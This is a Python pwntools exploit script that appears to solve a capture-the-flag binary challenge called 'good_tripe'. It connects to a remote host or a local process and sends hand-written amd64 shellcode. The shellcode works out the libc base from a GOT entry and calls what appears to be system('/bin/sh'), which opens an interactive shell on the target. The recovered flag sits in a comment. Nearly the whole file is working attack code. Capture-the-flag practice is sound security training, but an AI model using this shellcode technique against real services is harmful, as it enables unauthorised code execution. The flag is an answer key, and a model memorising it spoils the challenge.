#!/usr/bin/env python3
from pwn import *

exe = ELF("./good_tripe")
# context.log_level='debug'
context.terminal = ["foot"]
if args.REMOTE:
    p = remote("172.210.129.230", 1351)
else:
    p = process([exe.path])
    gdb.attach(p, """

               """)
    # p = gdb.debug([exe.path],"""
    #
    #                 """)
def bytes_to_hex(bytes_data):
  """Converts bytes to a hexadecimal string."""
  return ' '.join('{:02X}'.format(b) for b in bytes_data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
pl = asm(f"""
        mov rdi, 0x404010
        mov rdi, [rdi]
        sub rdi,0x1e55c0

        mov rcx, rdi
        add rcx,0x54690

        add rdi,0x1ace23
        mov rsp,0x404e90
        mov rbp,rsp
        call rcx
        

         """,arch='amd64')

log.info(f"payload: {bytes_to_hex(pl)}")
sla(b">>",pl)
#AKASEC{y34h_You_C4N7_PRO73C7_5om37hIn9_YoU_doN7_h4V3}






p.interactive()
# good luck pwning :)

